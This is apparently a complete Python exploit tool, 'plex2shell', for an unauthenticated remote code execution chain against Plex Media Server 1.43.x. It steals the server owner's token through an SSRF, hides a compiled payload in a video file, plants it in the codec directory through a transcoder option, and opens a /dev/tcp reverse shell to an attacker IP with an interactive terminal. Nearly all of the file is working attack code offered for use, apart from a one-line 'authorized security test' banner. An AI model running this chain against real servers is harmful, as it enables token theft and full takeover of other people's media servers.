"""
    plex2shell 
    Copyright (C) 2026 code-zm

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""

import argparse
import http.server
import os
import re
import shutil
import socket
import socketserver
import subprocess
import sys
import tempfile
import threading
import time
import types
import urllib.error
import urllib.parse
import urllib.request
from contextlib import redirect_stdout

import select
import termios
import tty

_DIR = os.path.dirname(os.path.abspath(__file__))


# ============================================================================== UI
C = {"reset": "\033[0m", "bold": "\033[1m", "cyan": "\033[38;5;44m",
     "green": "\033[38;5;42m", "red": "\033[38;5;203m", "grey": "\033[38;5;244m",
     "white": "\033[38;5;253m"}
SPIN = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
FULL, EMPTY, BARW = "█", "░", 32

STAGES = [("Connecting to target", 12), ("Capturing owner token", 40),
          ("Verifying access", 52), ("Building payload", 72),
          ("Delivering payload", 88), ("Opening session", 99)]

try:
    TTY = open("/dev/tty", "w")
except Exception:
    TTY = sys.stderr


def out(s):
    TTY.write(s)
    TTY.flush()


def bar(pct, frame, label, color="cyan", ok=False):
    fill = int(BARW * pct / 100.0)
    b = C[color] + FULL * fill + C["grey"] + EMPTY * (BARW - fill) + C["reset"]
    tick = (C["green"] + "✔" if ok else C[color] + SPIN[frame % len(SPIN)]) + C["reset"]
    out("\r\033[K  %s  %s  %s%3d%%%s   %s%s%s" % (
        tick, b, C["bold"] + C["white"], int(round(pct)), C["reset"], C["white"], label, C["reset"]))


def commit(line):
    out("\r\033[K" + line + "\n")


def redact(t):
    return (t[:10] + "…" + t[-4:]) if t and len(t) >= 14 else "captured"


class Step:
    """Run a blocking fn in a thread while the bar eases toward this stage's ceiling."""

    def __init__(self, idx):
        self.idx, self.ceil = idx, STAGES[idx][1]
        self.base = STAGES[idx - 1][1] if idx else 0

    def run(self, fn):
        res = {}
        done = threading.Event()

        def work():
            try:
                res["v"] = fn()
            except Exception as e:
                res["e"] = e
            finally:
                done.set()
        threading.Thread(target=work, daemon=True).start()
        pct, f = self.base, 0
        while not done.is_set():
            pct += (self.ceil - pct) * 0.06
            bar(pct, f, STAGES[self.idx][0])
            f += 1
            time.sleep(0.08)
        if "e" in res:
            bar(self.ceil, f, STAGES[self.idx][0], "red")
            commit("  %s✗%s %s" % (C["red"], C["reset"], STAGES[self.idx][0]))
            raise res["e"]
        return res.get("v")


# ============================================================================== platforms
PLATFORMS = {
    "linux-native": {
        "os": "linux",
        "appsupport": "/var/lib/plexmediaserver/Library/Application Support/Plex Media Server",
        "codec_suffix": "linux-x86_64", "ext": "so",
        "transcoder_path": "/usr/lib/plexmediaserver/Plex Transcoder",
    },
    "linux-docker": {
        "os": "linux",
        "appsupport": "/config/Library/Application Support/Plex Media Server",
        "codec_suffix": "linux-x86_64", "ext": "so",
        "transcoder_path": "/usr/lib/plexmediaserver/Plex Transcoder",
    },
    "windows": {
        "os": "windows",
        "appsupport": None,
        "codec_suffix": "windows-x86_64", "ext": "dll",
        "transcoder_path": "C:/Program Files/Plex/Plex Media Server/Plex Transcoder.exe",
    },
}


def resolve_platform(target_os_key):
    if target_os_key not in PLATFORMS:
        raise SystemExit("[-] unknown --target-os %r; choose one of: %s"
                         % (target_os_key, ", ".join(PLATFORMS)))
    return PLATFORMS[target_os_key]


# ============================================================================== payloads

def _read_payload(name):
    return open(os.path.join(_DIR, name)).read()


def build_payload_linux(workdir, inner_cmd):
    cc = shutil.which("gcc")
    if not cc:
        raise RuntimeError("need 'gcc' on the attacker host for a Linux target payload")
    src = os.path.join(workdir, "pay.c")
    so = os.path.join(workdir, "pay.so")
    with open(src, "w") as f:
        f.write(_read_payload("payload_linux.c").replace("__CMD__", inner_cmd))
    subprocess.check_call([cc, "-shared", "-fPIC", "-nostdlib", "-O2", "-o", so, src],
                          stderr=subprocess.STDOUT)
    data = open(so, "rb").read()
    if data[:4] != b"\x7fELF":
        raise RuntimeError("payload is not an ELF")
    return so, data


def build_payload_windows(workdir, attacker_ip, lport):
    cc = shutil.which("x86_64-w64-mingw32-gcc")
    if not cc:
        raise RuntimeError("need 'x86_64-w64-mingw32-gcc' (apt: gcc-mingw-w64-x86-64)")
    src = os.path.join(workdir, "pay.c")
    dll = os.path.join(workdir, "pay.dll")
    with open(src, "w") as f:
        f.write(_read_payload("payload_windows.c")
                .replace("__IP__", attacker_ip).replace("__PORT__", str(lport)))
    subprocess.check_call([cc, "-shared", "-O2", "-o", dll, src,
                           "-lws2_32", "-lkernel32", "-Wl,--subsystem,windows"],
                          stderr=subprocess.STDOUT)
    data = open(dll, "rb").read()
    if data[:2] != b"MZ":
        raise RuntimeError("payload is not a PE DLL")
    return dll, data


def build_payload(target_os, workdir, attacker_ip, lport, inner_cmd=None):
    if target_os == "linux":
        return build_payload_linux(workdir, inner_cmd)
    return build_payload_windows(workdir, attacker_ip, lport)


def build_carrier(workdir, payload_bytes, w, h):
    """Encode payload_bytes into frame-0 luma of a lossless (qp=0) carrier + silent audio track."""
    if not shutil.which("ffmpeg"):
        raise RuntimeError("need 'ffmpeg' on the attacker host to build the carrier")
    ysz = w * h
    if len(payload_bytes) > ysz:
        raise RuntimeError("payload (%d B) larger than luma plane %dx%d=%d; raise --geometry"
                           % (len(payload_bytes), w, h, ysz))
    y = payload_bytes + b"\x80" * (ysz - len(payload_bytes))
    uv = b"\x80" * (ysz // 2)
    frame = y + uv
    raw = os.path.join(workdir, "raw.yuv")
    open(raw, "wb").write(frame * 3)
    carrier = os.path.join(workdir, "carrier.mp4")
    subprocess.check_call([
        "ffmpeg", "-loglevel", "error", "-y",
        "-f", "rawvideo", "-pix_fmt", "yuv420p", "-s", "%dx%d" % (w, h), "-r", "5", "-i", raw,
        "-f", "lavfi", "-i", "anullsrc=r=48000:cl=stereo", "-shortest",
        "-c:v", "libx264", "-qp", "0", "-pix_fmt", "yuv420p", "-g", "1",
        "-c:a", "aac", "-b:a", "64k",
        "-movflags", "+faststart", carrier,
    ], stderr=subprocess.STDOUT)
    dec = os.path.join(workdir, "dec.yuv")
    subprocess.check_call([
        "ffmpeg", "-loglevel", "error", "-y", "-i", carrier, "-map", "0:v:0",
        "-pix_fmt", "yuv420p", "-f", "rawvideo", dec,
    ], stderr=subprocess.STDOUT)
    d = open(dec, "rb").read()
    if d[:len(payload_bytes)] != payload_bytes:
        raise RuntimeError("carrier is NOT bit-exact (encoder altered the plane); adjust geometry")
    return carrier


def revshell_cmd(attacker_ip, lport):
    return ("/usr/bin/setsid /usr/bin/bash -c 'exec 0<>/dev/tcp/%s/%d 1>&0 2>&0; "
            "exec /usr/bin/script -qc /bin/bash /dev/null' &" % (attacker_ip, lport))


# ============================================================================== attacker HTTP: media host
CALLBACKS = []

ITEM_XML = ('<?xml version="1.0" encoding="UTF-8"?><MediaContainer size="1">'
            '<Video ratingKey="1" key="/library/metadata/1" type="movie" title="poc" duration="3000">'
            '<Media id="1" duration="3000" width="{w}" height="{h}" aspectRatio="1.78" '
            'videoCodec="h264" audioCodec="aac" container="mp4" videoFrameRate="24p">'
            '<Part id="1" key="http://{ip}:{port}/carrier.mp4" duration="3000" '
            'file="carrier.mp4" size="{size}" container="mp4"/>'
            '</Media></Video></MediaContainer>')


def make_handler(carrier_path, item_xml_bytes):
    class H(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _send(self, body, ctype):
            self.send_response(200)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def do_GET(self):
            p = urllib.parse.urlparse(self.path).path
            if p.startswith("/cb"):
                CALLBACKS.append(self.path)
                self._send(b"ok", "text/plain")
            elif p.rstrip("/").endswith("item.xml") or p == "/item.xml":
                self._send(item_xml_bytes, "text/xml")
            elif p.endswith("carrier.mp4"):
                data = open(carrier_path, "rb").read()
                rng = self.headers.get("Range")
                if rng:
                    m = re.match(r"bytes=(\d+)-(\d*)", rng)
                    if m:
                        start = int(m.group(1))
                        end = int(m.group(2)) if m.group(2) else len(data) - 1
                        end = min(end, len(data) - 1)
                        chunk = data[start:end + 1]
                        self.send_response(206)
                        self.send_header("Content-Type", "video/mp4")
                        self.send_header("Content-Length", str(len(chunk)))
                        self.send_header("Content-Range",
                                         "bytes %d-%d/%d" % (start, end, len(data)))
                        self.send_header("Accept-Ranges", "bytes")
                        self.end_headers()
                        self.wfile.write(chunk)
                    else:
                        self._send(data, "video/mp4")
                else:
                    self.send_response(200)
                    self.send_header("Content-Type", "video/mp4")
                    self.send_header("Content-Length", str(len(data)))
                    self.send_header("Accept-Ranges", "bytes")
                    self.end_headers()
                    self.wfile.write(data)
            else:
                self._send(b"", "text/plain")
    return H


class Listener(threading.Thread):
    def __init__(self, ip, port, carrier_path, item_xml_bytes):
        super().__init__(daemon=True)
        socketserver.TCPServer.allow_reuse_address = True
        self.httpd = socketserver.ThreadingTCPServer((ip, port), make_handler(carrier_path, item_xml_bytes))

    def run(self):
        self.httpd.serve_forever()

    def stop(self):
        try:
            self.httpd.shutdown()
        except Exception:
            pass


# ============================================================================== attacker HTTP: token catcher
_TOKEN_RE = re.compile(r"^local-[0-9a-f-]{8,}", re.I)


class TokenCatcher(threading.Thread):
    def __init__(self, bind_ip, port):
        super().__init__(daemon=True)
        self.port = port
        self.hits = []
        self.token = None
        self.got = threading.Event()
        outer = self

        class H(http.server.BaseHTTPRequestHandler):
            def log_message(self, *a):
                pass

            def _serve(self):
                tok = self.headers.get("X-Plex-Token", "")
                outer.hits.append((self.command, self.path, dict(self.headers)))
                print("    [listener] %s %s   X-Plex-Token=%s"
                      % (self.command, self.path, tok or "(none)"))
                if tok and _TOKEN_RE.match(tok) and not outer.token:
                    outer.token = tok
                    outer.got.set()
                self.send_response(200)
                self.send_header("Content-Length", "2")
                self.end_headers()
                self.wfile.write(b"ok")

            do_GET = _serve
            do_POST = _serve

        socketserver.TCPServer.allow_reuse_address = True
        self.httpd = socketserver.TCPServer((bind_ip, port), H)

    def run(self):
        self.httpd.serve_forever()

    def stop(self):
        try:
            self.httpd.shutdown()
        except Exception:
            pass


# ============================================================================== Plex HTTP helpers
def hget(base, path, params, token, timeout=25, method="GET"):
    qs = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
    url = "%s%s?%s" % (base, path, qs)
    req = urllib.request.Request(url, method=method)
    if token:
        req.add_header("X-Plex-Token", token)
    try:
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return -1, str(e).encode()


def preq(base, path, headers, timeout=15):
    try:
        r = urllib.request.Request("http://%s%s" % (base, path), headers=headers)
        return urllib.request.urlopen(r, timeout=timeout).status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception as e:
        return "ERR:%s" % (str(e)[:70])


def discover_setid(base, token, transcoder_path):
    if not transcoder_path:
        return None
    for route in ("/system/:/resources/x", "/:/plugins/com.plexapp.system/resources/x"):
        st, body = hget(base, route, {"resource_name": transcoder_path}, token)
        if st == 200 and body:
            m = re.search(rb'([0-9a-f]{7}-[0-9a-f]{24,26})', body)
            if m:
                return m.group(1).decode()
    return None


def transcode_params(item_url, session, w, h):
    return [
        ("path", item_url), ("protocol", "hls"),
        ("directPlay", "0"), ("directStream", "0"),
        ("videoResolution", "%dx%d" % (w, h)),
        ("videoQuality", "100"), ("maxVideoBitrate", "200000"),
        ("mediaBufferSize", "102400"), ("session", session),
        ("X-Plex-Client-Identifier", "vfyclient01"),
        ("X-Plex-Product", "Plex Web"), ("X-Plex-Platform", "Chrome"),
        ("X-Plex-Platform-Version", "120.0"), ("X-Plex-Device", "Linux"),
        ("X-Plex-Device-Name", "poc"), ("X-Plex-Client-Profile-Name", "Chrome"),
        ("X-Plex-Session-Identifier", session),
    ]


def run_transcode(base, token, item_url, session, w, h):
    p = transcode_params(item_url, session, w, h)
    st1, _ = hget(base, "/video/:/transcode/universal/decision", p, token)
    st2, _ = hget(base, "/video/:/transcode/universal/start.m3u8", p, token)
    st3, _ = hget(base, "/video/:/transcode/universal/session/%s/base/index.m3u8" % session,
                  [("session", session)], token)
    return st1, st2, st3


# ============================================================================== stage 1+2: bare-WAN token theft
def steal_owner_token(args):
    base = args.target
    listener = TokenCatcher("0.0.0.0", args.token_port)
    listener.start()
    time.sleep(0.4)

    cid = "poc_%d" % (int(time.time()) % 100000)
    marker = "TKN_%d" % (int(time.time()) % 100000)

    hdr = {
        "X-Plex-Client-Identifier": cid,
        "X-Plex-Platform": "poc", "X-Plex-Platform-Version": "1",
        "X-Plex-Product": "poc", "X-Plex-Version": "1",
        "X-Plex-Device": "poc", "X-Plex-Device-Name": "poc", "X-Plex-Model": "poc",
        "X-Plex-Token": args.junk_token,
    }
    common = "deviceClass=pc&protocolCapabilities=playback&protocolVersion=1"

    ident = ("com.plexapp.agents.thetvdb/function/GetResultFromNetwork"
             "?url=http://%s:%d/%s#" % (args.attacker_host, args.token_port, marker))
    protocol = ("http://127.0.0.1:%d/system/agents/z/searchOne?mediaType=1&lang=en&identifier=%s"
                % (args.plex_port, urllib.parse.quote(ident, safe="")))
    proto_q = urllib.parse.quote(protocol, safe="")

    reg_path = "/player/proxy/poll?%s&X-Plex-Client-Identifier=%s" % (common, cid)
    threading.Thread(target=lambda: preq(base, reg_path, hdr, timeout=12), daemon=True).start()
    time.sleep(1.5)

    sub = ("/player/timeline/subscribe?%s&protocol=%s&port=%d&commandID=1"
           "&X-Plex-Target-Client-Identifier=%s" % (common, proto_q, args.token_port, cid))
    preq(base, sub, hdr)
    time.sleep(0.5)

    unsub = ("/player/timeline/unsubscribe?%s&X-Plex-Target-Client-Identifier=%s" % (common, cid))
    preq(base, unsub, hdr)

    listener.got.wait(timeout=args.wait)
    token = listener.token
    listener.stop()
    return token


# ============================================================================== Windows cmd protocol helpers
def _win_wait_ready(conn):
    conn.settimeout(30)
    buf = b""
    try:
        while b"READY" not in buf:
            d = conn.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass


def _win_send_cmd(conn, cmd):
    conn.sendall((cmd + "\r\n").encode())
    conn.settimeout(30)
    buf = b""
    try:
        while b"__CMDEND__" not in buf:
            d = conn.recv(4096)
            if not d:
                break
            buf += d
    except socket.timeout:
        pass
    return buf.decode("utf-8", "replace").replace("\r", "").split("__CMDEND__")[0]


# ============================================================================== interactive PTY bridge
def drain(conn, t=0.5):
    conn.setblocking(False)
    end = time.time() + t
    while time.time() < end:
        try:
            d = conn.recv(4096)
            if not d:
                break
            end = time.time() + 0.15
        except (BlockingIOError, OSError):
            time.sleep(0.03)


def _win_interactive(conn, session_label, hostlabel):
    _win_wait_ready(conn)
    out(C["grey"] + "  command mode — type 'exit' to quit\n\n" + C["reset"])
    prompt = C["bold"] + session_label + " @ " + hostlabel + C["reset"] + "> "
    try:
        while True:
            try:
                line = input(prompt)
            except EOFError:
                break
            if not line.strip():
                continue
            if line.strip().lower() == "exit":
                conn.sendall(b"exit\r\n")
                break
            output = _win_send_cmd(conn, line)
            for ln in output.splitlines():
                print(ln)
    except KeyboardInterrupt:
        conn.sendall(b"exit\r\n")
    out("\n" + C["grey"] + "  session closed\n" + C["reset"])


def interactive(conn, hostlabel, so_path, target_os, session_label):
    commit("  %s✔%s %sOpening session%s" % (C["green"], C["reset"], C["white"], C["reset"]))
    out("\n  " + C["bold"] + C["green"] + "✔ session opened" + C["reset"] +
        C["white"] + "  —  " + session_label + " @ " + hostlabel + C["reset"] + "\n")

    if target_os != "linux":
        return _win_interactive(conn, session_label, hostlabel)

    out(C["grey"] + "  interactive shell — press Ctrl-] to detach\n\n" + C["reset"])

    try:
        import fcntl
        import struct
        rows, cols = struct.unpack("HHHH",
            fcntl.ioctl(0, termios.TIOCGWINSZ, struct.pack("HHHH", 0, 0, 0, 0)))[:2]
        if not rows or not cols:
            rows, cols = 40, 120
    except Exception:
        rows, cols = 40, 120

    setup = ("rm -f '%s' 2>/dev/null; cd /; stty rows %d cols %d 2>/dev/null; "
             "export TERM=xterm-256color; PS1='plex@plex:\\w\\$ '\n"
             % (so_path, rows, cols))
    conn.sendall(setup.encode())
    time.sleep(0.5)
    drain(conn, 0.6)
    conn.sendall(b"\n")
    time.sleep(0.2)

    old = termios.tcgetattr(0)
    try:
        tty.setraw(0)
        conn.setblocking(False)
        while True:
            r, _, _ = select.select([0, conn], [], [])
            if 0 in r:
                d = os.read(0, 4096)
                if not d or b"\x1d" in d:
                    break
                conn.sendall(d)
            if conn in r:
                try:
                    d = conn.recv(4096)
                except BlockingIOError:
                    continue
                if not d:
                    break
                os.write(1, d)
    finally:
        termios.tcsetattr(0, termios.TCSADRAIN, old)
        out("\n" + C["grey"] + "  session detached\n" + C["reset"])



def run_exec(conn, command, so_path, target_os, session_label):
    out("\n  " + C["green"] + "✔ session opened (" + session_label + ")" + C["reset"] + "\n\n")
    if target_os == "linux":
        time.sleep(1)
        conn.setblocking(False)
        try:
            while True:
                conn.recv(4096)
        except Exception:
            pass
        conn.setblocking(True)
        conn.sendall(b"stty -echo 2>/dev/null\n")
        time.sleep(0.5)
        line = "rm -f '%s' 2>/dev/null; %s; echo __END__$?\n" % (so_path, command)
        conn.sendall(line.encode())
        conn.settimeout(15)
        buf = b""
        try:
            while b"__END__" not in buf:
                d = conn.recv(4096)
                if not d:
                    break
                buf += d
        except socket.timeout:
            pass
        for ln in buf.decode("utf-8", "replace").replace("\r", "").splitlines():
            if ln.startswith("__END__"):
                break
            if "echo __END__" in ln:
                continue
            print("    " + ln)
    else:
        _win_wait_ready(conn)
        output = _win_send_cmd(conn, command)
        conn.sendall(b"exit\r\n")
        for ln in output.splitlines():
            print("    " + ln)


# ============================================================================== orchestration
def main():
    ap = argparse.ArgumentParser(
        description="Plex Media Server 1.43.x — bare-WAN unauth RCE (CVSS 10.0)")
    ap.add_argument("--target", required=True, help="host:port (e.g. 10.0.0.5:32400)")
    ap.add_argument("--attacker-ip", required=True, help="attacker IP reachable from the target")
    ap.add_argument("--target-os", choices=list(PLATFORMS.keys()), default="linux-native",
                    help="linux-native (default), linux-docker, or windows")
    ap.add_argument("--token", default=None,
                    help="skip the SSRF chain and use this owner token directly")
    ap.add_argument("--exec", dest="exec_cmd", default=None,
                    help="run one command and exit instead of opening a shell")
    args = ap.parse_args()

    if ":" not in args.target:
        sys.exit("[-] --target must be host:port")

    plat = resolve_platform(args.target_os)
    target_os = plat["os"]
    appsupport = plat["appsupport"]
    codec_suffix = plat["codec_suffix"]
    ext = plat["ext"]
    transcoder_path = plat["transcoder_path"]
    session_label = "uid=1000(plex)" if target_os == "linux" else "the Plex service account"

    attacker_host = "127.0.0.1.%s.sslip.io" % args.attacker_ip.replace(".", "-")
    token_port, carrier_port, lport = 8952, 8933, 9001
    w, h = 640, 360

    base = "http://" + args.target
    logpath = os.path.join(tempfile.gettempdir(), ".plexshell_%d.log" % os.getpid())
    log = open(logpath, "w")

    needed = ["ffmpeg", "gcc" if target_os == "linux" else "x86_64-w64-mingw32-gcc"]
    for t in needed:
        if not shutil.which(t):
            sys.exit("[-] need '%s' on this host for the payload build" % t)

    out("\n  " + C["bold"] + C["white"] + "Plex Media Server 1.43.x — remote shell" + C["reset"] + "\n")
    out("  " + C["grey"] + ("authorized security test  —  target-os=%s" % args.target_os)
        + C["reset"] + "\n\n")

    lsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    lsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lsock.bind(("0.0.0.0", lport))
    lsock.listen(1)
    conn_box = {}
    got = threading.Event()

    def accept():
        try:
            c, a = lsock.accept()
            conn_box["c"], conn_box["a"] = c, a
        finally:
            got.set()
    threading.Thread(target=accept, daemon=True).start()

    token = args.token
    try:
        with redirect_stdout(log):
            Step(0).run(lambda: hget(base, "/identity", {}, None)[0])
            commit("  %s✔%s %sConnecting to target%s"
                   % (C["green"], C["reset"], C["white"], C["reset"]))

            if token:
                commit("  %s✔%s %sCapturing owner token%s  %s(pre-captured: %s)%s" % (
                    C["green"], C["reset"], C["white"], C["reset"], C["grey"], redact(token), C["reset"]))
            else:
                sargs = types.SimpleNamespace(
                    target=args.target, attacker_host=attacker_host,
                    attacker_ip=args.attacker_ip, token_port=token_port,
                    plex_port=32400, junk_token="TOTALLY_INVALID_JUNK",
                    wait=150)
                token = Step(1).run(lambda: steal_owner_token(sargs))
                if not token:
                    raise RuntimeError("owner token not captured")
                commit("  %s✔%s %sCapturing owner token%s  %s(%s)%s" % (
                    C["green"], C["reset"], C["white"], C["reset"], C["grey"], redact(token), C["reset"]))

            prefs_st, prefs_body = Step(2).run(lambda: hget(base, "/:/prefs", {}, token))
            if prefs_st != 200:
                raise RuntimeError("prefs returned %d; token may not be owner-tier" % prefs_st)
            if target_os == "windows" and not appsupport:
                m = re.search(rb'id="LocalAppDataPath"[^>]*value="([^"]*)"', prefs_body)
                if m:
                    lap = m.group(1).decode().replace("\\", "/")
                    if len(lap) >= 2 and lap[1] == ":":
                        lap = lap[2:]
                    appsupport = lap + "/Plex Media Server"
                else:
                    appsupport = "/Users/Administrator/AppData/Local/Plex Media Server"
            commit("  %s✔%s %sVerifying access%s  %s(owner)%s" % (
                C["green"], C["reset"], C["white"], C["reset"], C["grey"], C["reset"]))

            setid = discover_setid(base, token, transcoder_path)
            if not setid:
                raise RuntimeError("could not recover codec set-id; pass --setid")
            setdir = "%s/Codecs/%s-%s" % (appsupport, setid, codec_suffix)
            if target_os == "windows":
                so_name = "hevc_decoder.dll"
            else:
                so_name = "zz%d.%s" % (int(time.time()) % 100000, ext)
            so_path = "%s/%s" % (setdir, so_name)
            revsh = revshell_cmd(args.attacker_ip, lport) if target_os == "linux" else None

            def build():
                work = tempfile.mkdtemp(prefix="poc_shell_")
                _, payload = build_payload(target_os, work,
                                           args.attacker_ip, lport, inner_cmd=revsh)
                carrier = build_carrier(work, payload, w, h)
                return work, carrier
            work, carrier = Step(3).run(build)
            commit("  %s✔%s %sBuilding payload%s  %s(%s, %d B carrier)%s" % (
                C["green"], C["reset"], C["white"], C["reset"], C["grey"],
                args.target_os, os.path.getsize(carrier), C["reset"]))

            item_xml = ITEM_XML.format(w=w, h=h, ip=args.attacker_ip, port=carrier_port,
                                       size=os.path.getsize(carrier)).encode()
            listener = Listener("0.0.0.0", carrier_port, carrier, item_xml)
            listener.start()
            time.sleep(0.3)
            item_url = "http://%s:%d/item.xml" % (args.attacker_ip, carrier_port)

            def deliver():
                hget(base, "/:/prefs", {"TranscoderH264Options": "dump-yuv=%s:qp=0" % so_path},
                     token, method="PUT")
                run_transcode(base, token, item_url, "SHW%d" % (int(time.time()) % 100000), w, h)
                time.sleep(10)
                hget(base, "/:/prefs", {"TranscoderH264Options": ""}, token, method="PUT")
            Step(4).run(deliver)
            commit("  %s✔%s %sDelivering payload%s"
                   % (C["green"], C["reset"], C["white"], C["reset"]))

            def detonate():
                run_transcode(base, token, item_url, "SHD%d" % (int(time.time()) % 100000), w, h)
                got.wait(timeout=45)
                return conn_box.get("c")
            conn = Step(5).run(detonate)
            listener.stop()

        if not conn:
            bar(90, 0, "", "red")
            out("\n\n  " + C["red"] + "✗ no session — payload did not call back (see log)\n" + C["reset"])
            out(C["grey"] + "  log: %s\n" % logpath + C["reset"])
            return 1

        hostlabel = args.target.split(":")[0]
        if args.exec_cmd:
            run_exec(conn, args.exec_cmd, so_path, target_os, session_label)
        else:
            interactive(conn, hostlabel, so_path, target_os, session_label)
        return 0
    finally:
        try:
            if token:
                hget(base, "/:/prefs", {"TranscoderH264Options": ""}, token, method="PUT")
        except Exception:
            pass
        try:
            lsock.close()
        except Exception:
            pass
        log.close()


if __name__ == "__main__":
    sys.exit(main())
